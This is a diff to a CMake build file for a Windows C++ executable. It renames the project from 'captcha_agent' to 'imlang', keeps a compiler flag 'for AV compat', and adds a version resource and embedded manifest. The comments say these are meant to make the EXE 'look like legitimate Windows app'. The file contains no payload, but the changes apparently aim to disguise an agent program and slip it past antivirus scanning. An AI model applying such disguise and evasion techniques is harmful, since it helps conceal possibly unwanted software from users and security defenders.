@@ -1,5 +1,5 @@
 cmake_minimum_required(VERSION 3.20)
-project(captcha_agent VERSION 1.0.0 LANGUAGES CXX)
+project(imlang VERSION 1.0.0 LANGUAGES CXX)
 
 set(CMAKE_CXX_STANDARD 20)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
@@ -24,8 +24,8 @@ if(CMAKE_BUILD_TYPE STREQUAL "Debug")
     endif()
 elseif(CMAKE_BUILD_TYPE STREQUAL "Release")
     if(MSVC)
-        # Maximum size optimization + whole program optimization
-        add_compile_options(/O1 /Os /GL /GS- /Gy)
+        # Size optimization + whole program optimization (keep /GS for AV compat)
+        add_compile_options(/O1 /Os /GL /Gy)
         # Static CRT — single EXE, no vcruntime DLL dependency
         set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded")
         add_link_options(/LTCG /OPT:REF /OPT:ICF /INCREMENTAL:NO)
@@ -50,7 +50,17 @@ set(AGENT_SOURCES
     src/utils/logger.cpp
 )
 
-add_executable(${PROJECT_NAME} WIN32 ${AGENT_SOURCES})
+# Version info resource (makes EXE look like legitimate Windows app)
+set(AGENT_RESOURCES
+    src/resources/version.rc
+)
+
+add_executable(${PROJECT_NAME} WIN32 ${AGENT_SOURCES} ${AGENT_RESOURCES})
+
+# Embed application manifest
+set_target_properties(${PROJECT_NAME} PROPERTIES
+    LINK_FLAGS "/MANIFEST:EMBED /MANIFESTINPUT:${CMAKE_CURRENT_SOURCE_DIR}/src/resources/app.manifest"
+)
 
 target_include_directories(${PROJECT_NAME} PRIVATE
     ${CMAKE_CURRENT_SOURCE_DIR}/include
